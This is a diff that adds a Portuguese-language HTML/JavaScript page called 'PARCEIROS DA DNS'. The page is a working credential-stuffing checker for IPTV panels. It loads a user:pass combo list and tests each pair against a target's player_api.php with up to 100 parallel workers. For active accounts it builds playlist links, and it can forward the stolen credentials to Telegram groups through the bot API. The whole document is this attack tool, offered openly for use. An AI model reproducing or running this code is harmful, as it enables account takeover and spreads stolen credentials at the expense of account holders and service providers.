@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PARCEIROS DA DNS</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
+    body {
+      background: #001a33; color: #fff;
+      font-family: 'Orbitron', monospace;
+      padding: 10px;
+      margin: 0;
+    }
+    h2, h1 { 
+      color: #fff; text-align: center;
+      text-shadow: 0 0 7px #00ccff,0 0 24px #00ccff; 
+      font-size: 1.8rem;letter-spacing:.01em;
+      border:2px solid #00ccff; border-radius:13px; margin-bottom:18px;
+      user-select: none;
+    }
+    label{display:block;font-weight:700;margin-top:13px;color:#fff;text-shadow: 0 0 3px #00ccff;}
+    input[type="text"],input[type="number"],input[type="file"]{
+      background: #002244;color:#00ccff; border:2px solid #00ccff;
+      border-radius:8px; box-shadow:0 0 8px #00ccff inset;
+      padding:9px 13px;width: 100%;
+      font-family:'Orbitron',monospace; font-size:1rem;
+      margin-bottom:7px;
+      transition:.21s;
+    }
+    input[type="file"]{color:#00ccff;}
+    button{
+      margin-top: 9px;
+      padding: 11px 17px;
+      font-size: 1.08rem;
+      font-weight: bold;
+      font-family: 'Orbitron', monospace;
+      color: #001a33;
+      background: #00ccff;
+      border: 2px solid #00ccff;
+      border-radius: 11px;
+      cursor: pointer;
+      box-shadow: 0 0 16px #00ccff;
+      user-select: none;
+      transition: background-color 0.3s, box-shadow 0.3s;
+    }
+    button:hover:not(:disabled){background:#004466;color:#00ccff;border-color:#00ccff;box-shadow:0 0 35px #00ccff;}
+    button:disabled{background:#002244;border-color:#004466;color:#004466;cursor:not-allowed;}
+    .counterbox{
+      margin: 20px 0 10px 0;
+      display: flex; gap:15px; align-items: center; flex-wrap:wrap;
+      font-size: 1.08rem; font-family: 'Orbitron',monospace; justify-content:center;
+    }
+    .counterbox .metric{border:2px solid #00ccff; border-radius:9px; 
+    padding: 7px 12px; box-shadow:0 0 6px #00ccff; font-weight:700;
+      background: #002244; color:#fff; user-select: all; flex: 1; min-width: 120px; text-align: center;}
+    #progressBar{
+      background: #002244;
+      border-radius: 8px; margin-top: 7px; height: 17px; width: 100%;
+      overflow: hidden; border: 2px solid #00ccff; box-shadow: 0 0 10px #00ccff;
+    }
+    #progressBarFill{
+      background: #00ccff; height: 100%; width: 0%;
+      transition: width .35s cubic-bezier(.72,0,.41,1);
+    }
+    #progressText{margin-top: 7px; font-size:1rem; color:#00ccff;}
+    #hitsContainer{
+      margin-top:14px; max-height:50vh; overflow-y:auto;
+      background:#001a33; padding:15px;
+      border-radius:15px; border:2px solid #00ccff;
+      font-size:1rem; box-shadow:0 0 18px #00ccff; color:#fff;
+    }
+    .hit-block{
+      border:2px solid #00ccff;
+      margin-bottom:14px; padding:13px;
+      border-radius:13px; background:#001a33;
+      transition:.17s; display: flex; flex-direction: column;
+      word-break: break-all; white-space: pre-line;
+      box-shadow: 0 0 15px #00ccff;
+      position:relative;
+    }
+    .hit-block:hover{background:#002244;box-shadow:0 0 40px #00ccff;border-color:#00ccff;}
+    .hit-header{font-weight:700;margin-bottom:6px;color:#00ccff;}
+    .hit-content{white-space:pre-line;color:#fff;font-family:'Orbitron',monospace;margin-bottom:7px;font-size:1.04rem;}
+    .copy-btn{
+      align-self: flex-start;
+      margin-top: 2px; padding: 6px 13px; font-size: .87rem;
+      color: #001a33; background: #00ccff; border:2px solid #00ccff;
+      border-radius:8px; cursor:pointer; box-shadow:0 0 8px #00ccff;
+      transition: background-color .25s, box-shadow .22s;
+      width: fit-content;
+    }
+    .copy-btn:hover{background:#004466;color:#00ccff;border-color:#00ccff;box-shadow:0 0 14px #00ccff;}
+    #hitsContainer::-webkit-scrollbar{width:16px;}
+    #hitsContainer::-webkit-scrollbar-thumb{background:#00ccff;border-radius:10px;box-shadow:0 0 8px #00ccff;}
+    #hitsContainer::-webkit-scrollbar-track{background:#001a33;}
+    #tg-fab{
+      position:fixed;z-index:99999;right:22px;bottom:35px;
+      background:#0066aa; color:#fff; width:54px; height:54px;
+      border-radius:50%; display:flex;align-items:center;justify-content:center;
+      box-shadow:0 0 22px #00ccff; cursor:pointer; font-size:2.2rem;
+      border:2px solid #00ccff; transition:.2s;
+    }
+    #tg-fab:hover{box-shadow:0 0 46px #00ccff,0 0 10px #00ccff inset;background:#0088cc;}
+    #tg-modal-bg{display:none;position:fixed;z-index:100000;left:0;top:0;width:100vw;height:100vh;background:rgba(0,0,0,0.67)}
+    #tg-modal{position:absolute;left:50%;top:49%;transform:translate(-50%,-50%);
+      background:#001a33;border:3px solid #00ccff;border-radius:18px;min-width:335px;color:#fff;padding:35px 26px 16px 26px;
+      box-shadow:0 0 65px #00ccff,0 0 10px #00ccff inset;
+      font-family:'Orbitron',monospace;
+    }
+    #tg-close{position:absolute;top:6px;right:13px;font-size:2rem;cursor:pointer;color:#eee;text-shadow:0 0 10px #00ccff;
+      border:none;background:none;filter:drop-shadow(0 0 1px #000);}
+    #tg-close:hover{color:#00ccff}
+    #tg-modal h2{margin-top:0;font-size:1.01rem;text-align:left;color:#00ccff;}
+    #tg-group-list{margin-bottom:0;margin-top:13px;}
+    #tg-group-list option{padding:7px;}
+    .tg-group-item{margin:7px 0;border-bottom:1px solid #00ccff1a;font-size:.98rem;color:#fff;padding:4px 1px 2px 0;}
+    .tg-mini-title{font-size:1.1rem;font-weight:700;color:#00ccff;margin-bottom:3px;}
+    .tg-save-btn,.tg-add-btn{margin:7px 6px 5px 0;background:#00ccff;color:#001a33;font-family:'Orbitron',monospace;
+      border:2px solid #00ccff;border-radius:9px;padding:7px 20px;font-weight:700;font-size:1.01rem;
+      box-shadow:0 0 11px #00ccff;cursor:pointer;transition:.17s;}
+    .tg-save-btn:hover,.tg-add-btn:hover{background:#004466;color:#00ccff;}
+    .tg-delete-btn{background:#cc0033;color:#fff;font-size:.94rem;border:none;border-radius:7px;padding:3px 13px;margin-left:6px;cursor:pointer;font-weight:700;margin-top:-2px;transition:.18s;box-shadow:0 0 5px #cc0033;}
+    .tg-delete-btn:hover{background:#990022;}
+    .tg-form-row{margin-bottom:6px;}
+    .tg-form-row label{font-size:.97rem;margin-bottom:2px;display:block;}
+    select#tg-group-list{width:100%;font-size:.99rem;background:#002244;color:#00ccff;border:2px solid #00ccff;border-radius:7px;padding:5px 6px;margin-top:7px;}
+    #sendToTelegramBtn, #saveHitsBtn{
+      align-self:center;display:block;background:#0066aa;color:#fff;border:0;border-radius:9px;
+      font-size:1.01rem;font-family:'Orbitron',monospace;padding:10px 22px;margin:11px auto 11px auto;
+      box-shadow:0 0 13px #00ccff;cursor:pointer;transition:.19s;}
+    #sendToTelegramBtn:hover, #saveHitsBtn:hover{background:#00ccff;color:#001a33;}
+    footer{margin-top:32px;text-align:center;color:#eee;font-family:'Orbitron',monospace;font-size:13px;user-select:none;letter-spacing:.03em;text-shadow:0 0 7px #00ccff;}
+    
+    /* Estilos responsivos */
+    @media (max-width: 768px) {
+      body {
+        padding: 5px;
+      }
+      h1, h2 {
+        font-size: 1.5rem;
+      }
+      .counterbox {
+        flex-direction: column;
+        gap: 8px;
+      }
+      .counterbox .metric {
+        width: 100%;
+        padding: 5px;
+      }
+      button {
+        width: 100%;
+        padding: 10px 15px;
+      }
+      #hitsContainer {
+        max-height: 40vh;
+      }
+      #tg-modal {
+        min-width: 90%;
+        padding: 20px;
+      }
+    }
+    
+    /* Estilos para links clicáveis */
+    .hit-link {
+      color: #00ccff;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    .hit-link:hover {
+      color: #ffffff;
+      text-shadow: 0 0 8px #00ccff;
+    }
+  </style>
+</head>
+<body>
+  <h1>PARCEIROS DA DNS</h1>
+  <label for="hostInput">Painel (host com ou sem http/https):</label>
+  <input type="text" id="hostInput" placeholder="ex: lista.com:8080 ou http://lista.com:8080" autocomplete="off" />
+  <label for="comboFile">Escolha arquivo .txt com combos (user:pass):</label>
+  <input type="file" id="comboFile" accept=".txt" />
+  <label for="concurrencyInput">Número de conexões paralelas (bots) (até 100):</label>
+  <input type="number" id="concurrencyInput" min="1" max="100" value="20" />
+  <div class="counterbox">
+    <div class="metric">✅ Hits: <span id="hitsCount">0</span></div>
+    <div class="metric">❌ Erros: <span id="errCount">0</span></div>
+    <div class="metric">🦾 Bots ativos: <span id="workerCount">0</span></div>
+    <div class="metric">⚡️ Velocidade: <span id="speedVal">0.00</span>/s</div>
+  </div>
+  <div id="progressBar"><div id="progressBarFill"></div></div>
+  <div id="progressText">Aguardando início...</div>
+  <button id="startBtn" disabled>Iniciar Validação</button>
+  <button id="stopBtn" disabled>Parar Scan</button>
+  <button id="sendToTelegramBtn" disabled>Enviar Hits para Telegram</button>
+  <button id="saveHitsBtn" disabled>Salvar Hits em TXT</button>
+  <div id="hitsContainer" aria-live="polite" aria-atomic="true" aria-relevant="additions"></div>
+  <footer>Feito por Dark Mensageiro</footer>
+  <!-- Telegram FAB + Modal -->
+  <div id="tg-fab" title="Configurar Telegram"><span>✈️</span></div>
+  <div id="tg-modal-bg">
+    <div id="tg-modal">
+      <button id="tg-close" title="Fechar">&times;</button>
+      <h2>Gerenciar Grupos Telegram</h2>
+      <div class="tg-form-row">
+        <label for="tgNameInp">Nome p/Identificar o Grupo</label>
+        <input id="tgNameInp" type="text" autocomplete="off" placeholder="Nome do Grupo"/>
+      </div>
+      <div class="tg-form-row">
+        <label for="tgTokenInp">Token do Bot (@BotFather)</label>
+        <input id="tgTokenInp" type="text" autocomplete="off" placeholder="1234567890:ABC..."/>
+      </div>
+      <div class="tg-form-row">
+        <label for="tgChatIdInp">Chat ID/Chat Topic ID</label>
+        <input id="tgChatIdInp" type="text" autocomplete="off" placeholder="-100014123123 ou tópico"/>
+      </div>
+      <button class="tg-add-btn" id="tgAddGroupBtn">Adicionar Grupo</button>
+      <div style="margin:8px 0 6px 0;"><span class="tg-mini-title">Grupos Salvos</span></div>
+      <select id="tg-group-list" size="4"></select>
+      <div style="margin-top:10px;">
+        <button class="tg-save-btn" id="tgSaveGroupsBtn">Salvar Lista</button>
+        <button class="tg-delete-btn" id="tgDelGroupBtn" title="Excluir grupo selecionado">Excluir</button>
+      </div>
+    </div>
+  </div>
+<script>
+const hostInput = document.getElementById('hostInput');
+const comboFile = document.getElementById('comboFile');
+const concurrencyInput = document.getElementById('concurrencyInput');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const sendToTelegramBtn = document.getElementById('sendToTelegramBtn');
+const saveHitsBtn = document.getElementById('saveHitsBtn');
+const hitsContainer = document.getElementById('hitsContainer');
+const progressBarFill = document.getElementById('progressBarFill');
+const progressText = document.getElementById('progressText');
+const hitsCount = document.getElementById('hitsCount');
+const errCount = document.getElementById('errCount');
+const workerCount = document.getElementById('workerCount');
+const speedVal = document.getElementById('speedVal');
+let combos = [], hits = [];
+let totalCombos = 0, processedCount = 0, errorCount = 0, isRunning = false;
+let stopRequested = false, activeWorkers = 0, speedTimer = null;
+// --- JS Telegram Grupos
+let tgGroups = [];
+let selectedTelegramGroupIdx = 0;
+function loadTelegramGroups(){
+  try{ const j = JSON.parse(localStorage.getItem("tg-groups-list"));
+    if(Array.isArray(j)) tgGroups = j; else tgGroups=[];}catch{tgGroups=[];}
+}
+function saveTelegramGroups(){
+  localStorage.setItem("tg-groups-list",JSON.stringify(tgGroups));
+}
+function fillGroupList(){
+  let sel = document.getElementById("tg-group-list");
+  sel.innerHTML = "";
+  tgGroups.forEach((g,i)=>{
+    let op = document.createElement("option");
+    op.value=i; op.textContent= `${g.name} (${g.chatid.slice(0,15)}...)`;
+    sel.appendChild(op);
+  });
+  if(sel.options.length) sel.selectedIndex = selectedTelegramGroupIdx >=0 && selectedTelegramGroupIdx<tgGroups.length ? selectedTelegramGroupIdx:0;
+}
+function atualizarProgresso() {
+  const percent = totalCombos === 0 ? 0 : (processedCount / totalCombos) * 100;
+  progressBarFill.style.width = percent + '%';
+  progressText.textContent = `Processados: ${processedCount} / ${totalCombos} | Hits: ${hits.length} | Fails: ${errorCount}`;
+  hitsCount.textContent = hits.length;
+  errCount.textContent = errorCount;
+  workerCount.textContent = activeWorkers;
+}
+function startSpeedCounter() {
+  if(speedTimer)clearInterval(speedTimer);
+  let last = processedCount;
+  speedTimer = setInterval(()=>{
+    let now = processedCount;
+    let delta = now-last;
+    speedVal.textContent=(delta).toFixed(2);
+    last=now;
+  },1000);
+}
+function stopSpeedCounter(){
+  if(speedTimer) clearInterval(speedTimer);
+}
+function limparHost(host) {
+  host = host.trim();
+  if (host.startsWith('http://')) host = host.slice(7);
+  else if (host.startsWith('https://')) host = host.slice(8);
+  return host;
+}
+function unixToCustomStr(unix) {
+  if (!unix || isNaN(Number(unix))) return '-';
+  const d = new Date(Number(unix) * 1000);
+  return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,0)}-${String(d.getDate()).padStart(2,0)}:${String(d.getHours()).padStart(2,0)}-${String(d.getMinutes()).padStart(2,0)}-${String(d.getSeconds()).padStart(2,0)}`;
+}
+async function fetchTimeout(resource, options = {}) {
+  const { timeout = 11000 } = options;
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeout);
+  try {
+    const response = await fetch(resource, { ...options, signal: controller.signal });
+    clearTimeout(id);
+    return response;
+  } catch (e) {
+    clearTimeout(id);
+    throw e;
+  }
+}
+async function validarCombo(host, combo) {
+  try {
+    if (stopRequested) return null;
+    const [user, pass] = combo.split(':');
+    if (!user || !pass) return null;
+    const urlUserInfo = `http://${host}/player_api.php?username=${user}&password=${pass}`;
+    const resUserInfo = await fetchTimeout(urlUserInfo);
+    if (!resUserInfo.ok) { errorCount++; return null; }
+    const dataUser = await resUserInfo.json();
+    if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) { errorCount++; return null; }
+    const info = dataUser.user_info;
+    const mensagem = dataUser.message || "-";
+    const status = info.status || "Desconhecido";
+    const criada = unixToCustomStr(info.created_at);
+    const expira = unixToCustomStr(info.exp_date);
+    const conexoes = info.max_connections || "-";
+    const ativas = info.active_cons || "-";
+    const localidade = info.timezone || "-";
+    let porta = "80";
+    let hostSemPorta = host;
+    if (host.includes(':')) { [hostSemPorta, porta] = host.split(':'); }
+    const dataDoScan = unixToCustomStr(dataUser.time_now || Math.floor(Date.now()/1000));
+    const m3u = `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
+    const ssiptv = `http://${host}/ssiptv/get/${user}/${pass}/download_m3u`;
+    const epg1 = `http://${host}/xmltv.php?username=${user}&password=${pass}`;
+    const epg2 = `http://${host}/xmltv.php?username=${user}&password=${pass}&type=dreambox&output=mpegts`;
+    let canais = '';
+    
+    // Formato HTML com links clicáveis
+    const texto =
+`─ 🤝🤝 𝑷𝑨𝑹𝑪𝑬𝑰𝑹𝑶𝑺 𝑫𝑨 𝑫𝑵𝑺 🤝🤝
+|
+|𝑮𝑹𝑼𝑷𝑶𝑺 𝑫𝑬 𝑰𝑷𝑻𝑽 𝑭𝑹𝑬𝑬 ⤵️
+┣◯ NETOFLIX ► (https://t.me/Neto_FlixOF)  
+┣◯ [TODOS SOMOS EIRE ► (https://t.me/+aZov2qb1XoVmYzkx)
+┣◯ [MUNDO DOS BOTS ► (https://t.me/MUNDO_DOS_BOTS)  
+┣◯ [KAKUZU IPTV 2  ►(https://t.me/+EilVL2nDETdlODQx)  
+┣◯ [FENIXFREEIPTV ► (https://t.me/FENIXFREEIPTV)  
+┣◯ [MESTRE DOS APK ► (https://t.me/listanova2025)  
+┣◯ [HIDAN IPTV E LICENÇAS ► (https://t.me/+EdKmnySZVfJjNjIx)   
+┣◯ [GRUPO DO FEH ► (https://t.me/grupodofeh)  
+┣◯ [LISTA IPTV GRÁTIS ► (https://t.me/Listasiptv762)  
+┣◯ [DERRUBEM MEU P. IPTV ► (https://t.me/LISTAIPTVGRATIS2025)  
+┣◯ [KAMBIOPRO IPTV ► (https://t.me/kambioproiptv)  
+┣◯ [GRUPO FOREVER ► (https://t.me/+PhXQILNVc3Q0MzVh)  
+┣◯ [CANAL/FEH TUTORIAIS ► (https://t.me/canaldofeh)
+┣◯ [PYTHON SNAKE  ► (https://t.me/+edBVTp_OzHI3M2Ux)
+|
+┣◯ 𝐋𝐈𝐒𝐓𝐀 𝐈𝐏𝐓𝐕  ⤵️
+┣◯🌍HOST: ► ${hostSemPorta}
+┣◯💁USUARIO: ► ${user}
+┣◯🔐SENHA: ► ${pass}
+┣◯📆EXPIRA EM: ► ${expira}
+┣◯👀CON.ATIVAS: ► ${ativas}
+┣◯ 𝗟𝗜𝗦𝗧𝗔 𝗠𝟯𝗨 ⤵️
+╰─>${m3u}`;
+    return { texto, user, pass, host:hostSemPorta };
+  } catch {
+    errorCount++; return null;
+  }
+}
+function mostrarHit(hit) {
+  const div = document.createElement('div');
+  div.className = 'hit-block';div.tabIndex = 0;
+  div.setAttribute('role', 'button');
+  div.setAttribute('aria-label', `Usuário ${hit.user} Senha ${hit.pass}`);
+  const header = document.createElement('div');
+  header.className = 'hit-header';
+  header.textContent = `Usuário: ${hit.user} | Senha: ${hit.pass}`;
+  div.appendChild(header);
+  const content = document.createElement('div');
+  content.className = 'hit-content';
+  content.innerHTML = hit.texto; // Usando innerHTML para renderizar os links
+  div.appendChild(content);
+  const copyButton = document.createElement('button');
+  copyButton.className = 'copy-btn';
+  copyButton.textContent = 'Copiar';
+  copyButton.title = 'Copiar este hit';
+  copyButton.addEventListener('click', e=>{
+    e.stopPropagation();
+    navigator.clipboard.writeText(hit.texto.replace(/<a href="[^"]*" class="hit-link"[^>]*>([^<]*)<\/a>/g, '$1')).then(()=>{
+      copyButton.textContent = 'Copiado!';
+      setTimeout(()=>copyButton.textContent = 'Copiar', 1400);
+    })
+  });
+  div.appendChild(copyButton);
+  hitsContainer.prepend(div);
+}
+function refreshStartButton() {
+  const hostOk = hostInput.value.trim().length > 0;
+  const combosOk = combos.length > 0;
+  startBtn.disabled = !(hostOk && combosOk) || isRunning;
+}
+hostInput.addEventListener('input', refreshStartButton);
+comboFile.addEventListener('change', () => {
+  combos = [];
+  hitsContainer.textContent = '';
+  sendToTelegramBtn.disabled = true;
+  saveHitsBtn.disabled = true;
+  const file = comboFile.files[0];
+  if (!file) { startBtn.disabled = true; return; }
+  const reader = new FileReader();
+  reader.onload = e => {
+    combos = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l);
+    refreshStartButton();
+  };
+  reader.readAsText(file);
+});
+startBtn.addEventListener('click', () => {
+  if (isRunning) return;
+  startBtn.disabled = true;
+  sendToTelegramBtn.disabled = true;
+  saveHitsBtn.disabled = true;
+  stopBtn.disabled = false;
+  hitsContainer.textContent = '';
+  progressText.textContent = 'Iniciando validação...';
+  errorCount = 0; processedCount = 0; hits = [];
+  totalCombos = combos.length; stopRequested = false;
+  atualizarProgresso();
+  let host = limparHost(hostInput.value);
+  let concorrencia = Math.max(1,Math.min(100,parseInt(concurrencyInput.value)||20));
+  processarCombos(host, combos, concorrencia);
+});
+stopBtn.addEventListener('click', () => {
+  if(!isRunning) return;
+  stopRequested = true;
+  stopBtn.disabled = true;
+  progressText.textContent += ' | Parando validação...';
+});
+async function processarCombos(host, combos, concorrencia) {
+  hitsContainer.textContent = '';
+  hits = []; totalCombos = combos.length; processedCount = 0; errorCount = 0;
+  isRunning = true; stopRequested = false;
+  atualizarProgresso(); activeWorkers = concorrencia; startSpeedCounter();
+  let index = 0;
+  async function worker() {
+    while (index < totalCombos && !stopRequested) {
+      const i = index++;
+      const combo = combos[i];
+      const hit = await validarCombo(host, combo);
+      processedCount++;
+      if (hit) { hits.push(hit); mostrarHit(hit); }
+      atualizarProgresso();
+    } activeWorkers--; workerCount.textContent = activeWorkers;
+  }
+  const workers = [];
+  for (let i = 0; i < concorrencia; i++) {workers.push(worker());}
+  await Promise.all(workers);
+  isRunning = false; stopSpeedCounter();
+  if(stopRequested){progressText.textContent += ' | Scan parado pelo usuário.';}
+  else{progressText.textContent += ' | Validação finalizada.';}
+  sendToTelegramBtn.disabled = !hits.length;
+  saveHitsBtn.disabled = !hits.length;
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+}
+// Função para salvar os hits em um arquivo TXT
+saveHitsBtn.addEventListener('click', () => {
+  if (!hits.length) return;
+  
+  let content = '';
+  hits.forEach(hit => {
+    // Removendo tags HTML para salvar como texto puro
+    content += hit.texto.replace(/<a href="[^"]*" class="hit-link"[^>]*>([^<]*)<\/a>/g, '$1') + '\n\n';
+  });
+  
+  const blob = new Blob([content], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'LISTAS GRÁTIS DO POVO.txt';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+});
+loadTelegramGroups(); fillGroupList();
+sendToTelegramBtn.addEventListener('click', async ()=>{
+  if(!hits.length) return alert('Nenhum hit encontrado para enviar!');
+  if(!tgGroups.length) return alert('Cadastre um grupo Telegram no botão ✈️!');
+  let selList = document.getElementById("tg-group-list");
+  let selIdx = selList.selectedIndex >=0 ? selList.selectedIndex : 0;
+  if(selIdx<0||!tgGroups[selIdx]) return alert('Selecione um grupo Telegram!');
+  const group = tgGroups[selIdx];
+  const token = group.token.trim();
+  const chatId = group.chatid.trim();
+  let ok=0,fail=0;
+  sendToTelegramBtn.disabled = true;
+  for (const hit of hits) {
+    let blocks = []; let t = hit.texto.replace(/<a href="[^"]*" class="hit-link"[^>]*>([^<]*)<\/a>/g, '$1');
+    while(t.length>0) { blocks.push(t.slice(0,4095)); t=t.slice(4095);}
+    for(const blk of blocks){
+      try{
+        let resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+          method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({chat_id: chatId, text: blk})
+        });
+        let dat = await resp.json();
+        if(dat.ok) ok++; else fail++;
+      }catch{fail++;}
+      await new Promise(r=>setTimeout(r,250));
+    }
+  }
+  alert(`Enviados: ${ok} com sucesso.\nFalhas: ${fail}`);
+  sendToTelegramBtn.disabled = false;
+});
+//// FAB, MODAL, show/hide
+const tgFabEl = document.getElementById("tg-fab");
+const tgModalBG = document.getElementById("tg-modal-bg");
+const tgClose = document.getElementById("tg-close");
+const tgAddBtn = document.getElementById("tgAddGroupBtn");
+const tgSaveBtn = document.getElementById("tgSaveGroupsBtn");
+const tgDelBtn = document.getElementById("tgDelGroupBtn");
+const tgListSel = document.getElementById("tg-group-list");
+tgFabEl.onclick = ()=>{tgModalBG.style.display="block";};
+tgClose.onclick = ()=>{tgModalBG.style.display="none";};
+tgAddBtn.onclick = ()=>{
+  let name=document.getElementById("tgNameInp").value.trim();
+  let token=document.getElementById("tgTokenInp").value.trim();
+  let chatid=document.getElementById("tgChatIdInp").value.trim();
+  if(!name || !token || !chatid) return alert('Preencha todos os campos!');
+  tgGroups.push({name, token, chatid});
+  saveTelegramGroups();
+  fillGroupList();
+  document.getElementById("tgNameInp").value="";
+  document.getElementById("tgTokenInp").value="";
+  document.getElementById("tgChatIdInp").value="";
+};
+tgSaveBtn.onclick = ()=>{
+  saveTelegramGroups(); alert("Grupos salvos!");
+};
+tgDelBtn.onclick = ()=>{
+  let idx = tgListSel.selectedIndex;
+  if(idx>=0&&tgGroups[idx]){
+    tgGroups.splice(idx,1); saveTelegramGroups(); fillGroupList();
+  }
+};
+tgListSel.onchange = ()=>{
+  selectedTelegramGroupIdx = tgListSel.selectedIndex;
+};
+tgModalBG.onclick = e=>{if(e.target===tgModalBG) tgModalBG.style.display="none";};
+document.onkeydown = function(evt) { if(evt.key==="Escape") tgModalBG.style.display="none"; };
+</script>
+</body>
+</html>
